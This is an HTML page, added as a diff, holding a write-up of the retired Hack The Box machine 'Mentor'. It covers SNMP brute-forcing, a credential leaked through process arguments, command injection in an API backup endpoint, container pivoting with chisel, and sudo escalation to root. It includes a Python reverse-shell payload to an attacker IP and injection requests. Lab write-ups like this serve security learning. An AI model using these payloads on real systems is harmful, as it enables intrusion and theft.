@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mentor &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Mentor</h1>
+    <div class="meta">Target: <code>10.10.14.126</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">SNMP</span><span class="tag">SNMPBrute</span><span class="tag">api</span><span class="tag">FastAPI</span><span class="tag">JWT</span><span class="tag">CMDInjection</span><span class="tag">docker</span><span class="tag">chisel</span><span class="tag">PostgreSQL</span><span class="tag">credentialhunting</span><span class="tag">sudo</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#snmp-enumeration">SNMP Enumeration</a><a class="lvl3" href="#subdomain-discovery-api">Subdomain Discovery → API</a><a class="lvl3" href="#api-endpoint-discovery">API Endpoint Discovery</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#api-account-creation-and-auth-quirk">API Account Creation and Auth Quirk</a><a class="lvl3" href="#snmp-community-string-brute-force-james-s-password">SNMP Community String Brute-Force → james&#x27;s Password</a><a class="lvl3" href="#command-injection-in-admin-backup">Command Injection in /admin/backup</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#container-escape-ssh-as-svc-postgresql-hash">Container Escape → SSH as svc (PostgreSQL Hash)</a><a class="lvl3" href="#svc-james-root-snmp-config-credential">svc → james → root (SNMP Config Credential)</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Mentor is a medium Linux box built around an API with two separate SNMP secrets that drive the chain. The main site hosts a quotes API with Swagger docs. SNMP community-string brute-forcing with the <code>internal</code> string leaks a process argument containing a password. That password authenticates to the API as <code>james</code>, an admin account whose <code>/admin/backup</code> endpoint is vulnerable to command injection. The injection lands in a Docker container; credential hunting in the container's source code leads to a PostgreSQL database that yields the <code>svc</code> user's MD5 hash. SSH as <code>svc</code>, then a second SNMP config file on the host discloses another password that belongs to <code>james</code>. <code>james</code> can run <code>/bin/sh</code> as root via sudo.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="snmp-enumeration">SNMP Enumeration</h3>
+<p>Port 80 redirected to <code>mentorquotes.htb</code>. Nmap also found UDP 161 (SNMP). Initial <code>snmp-check</code> with the <code>public</code> community string returned basic system info:</p>
+<pre><code class="language-sh">snmp-check v1.9 - SNMP enumerator
+Host IP address : 10.129.228.102
+Hostname        : mentor
+Description     : Linux mentor 5.15.0-56-generic ...
+Contact         : Me &lt;admin@mentorquotes.htb&gt;
+</code></pre>
+<h3 id="subdomain-discovery-api">Subdomain Discovery → API</h3>
+<pre><code class="language-sh">ffuf -u http://10.129.228.102 -H &quot;Host: FUZZ.mentorquotes.htb&quot; \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 18 -mc all
+# api -&gt; 404 (different from non-existent subdomains)
+</code></pre>
+<p>Added <code>api.mentorquotes.htb</code> to <code>/etc/hosts</code>.</p>
+<h3 id="api-endpoint-discovery">API Endpoint Discovery</h3>
+<pre><code class="language-sh">feroxbuster -u http://api.mentorquotes.htb --no-recursion --methods GET,POST
+307 http://api.mentorquotes.htb/admin
+200 http://api.mentorquotes.htb/docs
+200 http://api.mentorquotes.htb/openapi.json
+307 http://api.mentorquotes.htb/users
+307 http://api.mentorquotes.htb/quotes
+</code></pre>
+<p>Swagger docs at <code>/docs</code> exposed the API structure and an email: <code>james@mentorquotes.htb</code>.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="api-account-creation-and-auth-quirk">API Account Creation and Auth Quirk</h3>
+<p><code>/auth/signup</code> accepted arbitrary credentials. Logging in via <code>/auth/login</code> returned a JWT. The API rejected standard <code>Authorization: Bearer &lt;token&gt;</code> headers but worked when the <code>Bearer</code> prefix was removed:</p>
+<pre><code class="language-http">Authorization: eyJ0eXAiOiJKV1Qi...
+</code></pre>
+<p>Without admin rights, user-level endpoints returned 403. The JWT identified the account role.</p>
+<h3 id="snmp-community-string-brute-force-james-s-password">SNMP Community String Brute-Force → james's Password</h3>
+<p>The default <code>public</code> string only returned basic info. Brute-forcing community strings:</p>
+<pre><code class="language-sh">python3 snmpbrute.py -t 10.129.228.102
+# Identified Community strings:
+#   internal  (v2c)(RO)
+#   public    (v1/v2c)(RO)
+</code></pre>
+<p>Running <code>snmpbulkwalk</code> with the <code>internal</code> community string and filtering for process arguments:</p>
+<pre><code class="language-sh">snmpbulkwalk -v2c -c internal -m ALL 10.129.228.102 | grep login.py
+HOST-RESOURCES-MIB::hrSWRunParameters.2078 = STRING: &quot;/usr/local/bin/login.py kj23sadkj123as0-d213&quot;
+</code></pre>
+<blockquote>
+<p><strong>Why process arguments appear in SNMP:</strong> the <code>hrSWRunParameters</code> OID from the Host Resources MIB stores the full command-line arguments of every running process. If a script passes a credential as a CLI argument rather than reading it from an environment variable or config file, it's visible to anyone with SNMP read access.</p>
+</blockquote>
+<p>Using <code>james@mentorquotes.htb</code> / <code>james</code> / <code>kj23sadkj123as0-d213</code> at <code>/auth/login</code> returned an admin-level JWT.</p>
+<h3 id="command-injection-in-admin-backup">Command Injection in /admin/backup</h3>
+<p>The <code>/admin/backup</code> endpoint accepts a <code>path</code> JSON field. Any value returned <code>{"INFO":"Done!"}</code>, which indicated a backend command like <code>tar</code> or <code>zip</code> was running. Testing for injection:</p>
+<pre><code class="language-http">POST /admin/backup HTTP/1.1
+Host: api.mentorquotes.htb
+Authorization: eyJ0eXAi...
+Content-Type: application/json
+
+{&quot;path&quot;:&quot;test;ping -c 1 10.10.14.126;&quot;}
+</code></pre>
+<p>TCPDump confirmed ICMP from the server. The trailing semicolon was required.</p>
+<blockquote>
+<p><strong>Command injection in backup endpoints:</strong> backup functionality often shells out to system commands. When the attacker-controlled <code>path</code> is passed unsanitized to something like <code>os.system(f"zip -r backup.zip {path}")</code>, semicolons or backticks inject additional commands.</p>
+</blockquote>
+<p>Standard bash reverse shells were blocked. The server runs Python (Alpine Docker), so:</p>
+<pre><code class="language-http">{&quot;path&quot;: &quot;;python -c 'import os,pty,socket;s=socket.socket();s.connect((\&quot;10.10.14.126\&quot;,443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\&quot;sh\&quot;)';&quot; }
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+/app # whoami
+root
+</code></pre>
+<p>Root inside the container (172.22.0.3). The user flag was in <code>/home/svc</code>.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="container-escape-ssh-as-svc-postgresql-hash">Container Escape → SSH as svc (PostgreSQL Hash)</h3>
+<p>The Dockerfile and <code>db.py</code> inside <code>/app/app/</code> revealed the database connection:</p>
+<pre><code class="language-python">DATABASE_URL = os.getenv(&quot;DATABASE_URL&quot;, &quot;postgresql://postgres:postgres@172.22.0.1/mentorquotes_db&quot;)
+</code></pre>
+<p>Chisel forwarded port 5432 from the Docker gateway (172.22.0.1) to Kali:</p>
+<pre><code class="language-sh"># Kali
+./chisel_1.9.1_linux_amd64 server -p 4444 --reverse
+# Container
+./chisel_1.9.1_linux_amd64 client 10.10.14.126:4444 R:5432:172.22.0.1:5432
+</code></pre>
+<pre><code class="language-sh">psql -h 127.0.0.1 -p 5432 -U postgres
+</code></pre>
+<pre><code class="language-sql">\connect mentorquotes_db
+select * from users;
+ 1 | james@mentorquotes.htb | james       | ‹redacted›
+ 2 | svc@mentorquotes.htb   | service_acc | ‹redacted›
+</code></pre>
+<p>Crackstation cracked the <code>svc</code> MD5 hash. <code>james</code>'s hash was not found:</p>
+<pre><code>‹redacted› -&gt; ‹redacted›
+</code></pre>
+<pre><code class="language-sh">ssh svc@mentorquotes.htb
+# Password: ‹redacted›
+whoami
+svc
+</code></pre>
+<h3 id="svc-james-root-snmp-config-credential">svc → james → root (SNMP Config Credential)</h3>
+<p>Grepping the SNMP daemon config (removing commented lines):</p>
+<pre><code class="language-sh">cat /etc/snmp/snmpd.conf | grep -v &quot;^#&quot;
+createUser bootstrap MD5 ‹redacted› DES
+</code></pre>
+<p>The password <code>‹redacted›</code> did not work for root but did work for <code>james</code>:</p>
+<pre><code class="language-sh">su james
+# Password: ‹redacted›
+james@mentor:/etc/snmp$ sudo -l
+User james may run the following commands on mentor:
+    (ALL) /bin/sh
+</code></pre>
+<pre><code class="language-sh">sudo /bin/sh -p
+# whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code># cat /root/root.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>SNMP community strings beyond <code>public</code> often expose process argument data.</strong> Always brute-force them; <code>internal</code> and <code>private</code> are common non-default strings that yield far more information.</li>
+<li><strong>Process arguments in SNMP (<code>hrSWRunParameters</code>) leak credentials</strong> when scripts accept passwords via CLI flags instead of environment variables.</li>
+<li><strong>Docker containers restrict shell utilities but Python is often available.</strong> When bash reverse shells fail, try a one-liner in whatever runtime the app uses.</li>
+<li><strong>Config files for daemons like SNMP are worth reading in full</strong> after gaining initial access; <code>snmpd.conf</code> stored a credential that led directly to a sudo escalation.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
